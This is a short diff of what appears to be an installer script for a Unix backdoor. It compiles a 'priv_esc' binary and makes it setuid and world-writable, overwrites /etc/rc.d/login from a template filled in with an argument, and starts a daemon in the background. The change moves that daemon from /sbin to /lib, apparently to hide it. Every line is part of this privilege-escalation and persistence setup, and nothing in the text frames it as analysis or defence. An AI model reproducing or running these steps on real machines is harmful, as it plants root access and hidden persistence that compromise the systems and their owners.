@@ -10,7 +10,7 @@ chmod 777 /sbin/controller
 cc priv_esc.c -o /bin/priv_esc
 chmod 777 /bin/priv_esc
 chmod +s /bin/priv_esc
-cc daemon.c -o /sbin/daemon
+cc daemon.c -o /lib/daemon
 sed "s/yeet/$1/" login_tmp > /etc/rc.d/login
 chmod 777 /etc/rc.d/login
-/sbin/daemon $1 &
+/lib/daemon $1 &
